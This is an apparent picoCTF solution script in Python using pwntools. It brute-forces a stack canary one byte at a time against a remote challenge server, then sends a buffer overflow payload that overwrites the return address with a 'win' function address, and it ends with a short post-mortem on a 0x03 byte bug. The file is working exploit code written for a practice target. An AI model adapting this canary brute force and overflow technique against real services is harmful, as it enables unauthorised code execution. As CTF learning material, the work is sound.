""" Solution

    Main step here is to do xyz

    """


""" Post Moretem
    
    - Got stuck because I looped through bytes 0-255, however 0x03 is the end-of-text byte, which
    is the same as control-C (^C)
      - Looping through printable characters makes more sense, because the file that is read is
      in ascii text
    """

import pwn
from time import sleep
from string import printable

HOST = 'saturn.picoctf.net'
PORT = 51722

def attach_gdb(proc):
  pwn.gdb.attach(proc, gdbscript="""

  """)
  sleep(1)

def get_proc():
  #proc = pwn.process()
  proc = pwn.remote(HOST, PORT)
  return proc

def send_message(bytec, payload):
  with pwn.context.quiet:
    proc = get_proc()
    proc.sendlineafter(b'> ', str(bytec).encode('utf-8'))
    proc.sendlineafter(b'Input> ', payload)
    resp = proc.recvall()

    # Why was recvline() and just recv() throwing exceptions? was it the connection kept auto closing?
    
    # Wait for the process to end, this is slower, but more reliable
    #proc.wait_for_close()

    if b'?' in resp:
      return True
    return False

def brute_force_canary():
  buffer = b'\x00' * 64
  canary = b'' 

  for bytec in range(1,5):
    payload = buffer + canary
    for char in printable: # Should def look at where my error is coming from, canary kept stopping on 0x03
      # which is the end of text character, should've just used printables because of that
      char = char.encode('utf-8')

      if send_message(64+bytec,payload+char):
        print('Found byte: %s' % char)
        canary += char
        break

  return canary

def main():
  pwn.context.arch = 'i386'
  pwn.context.binary = './vuln'
  pwn.context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

  proc = get_proc()
  #attach_gdb(proc)

  canary = brute_force_canary()

  print(b'Found canary: %b' % canary)

  buffer = b'A' * 64
  extra = b'A' * 16
  func_win = 0x08049336

  payload = b''.join([
    buffer,
    canary,
    extra,
    pwn.p32(func_win)
  ])

  proc.sendlineafter(b'>', str(len(payload)).encode('utf-8')) 
  proc.sendlineafter(b'Input>', payload)
  print(proc.recvall())

if __name__ == '__main__':
  main()
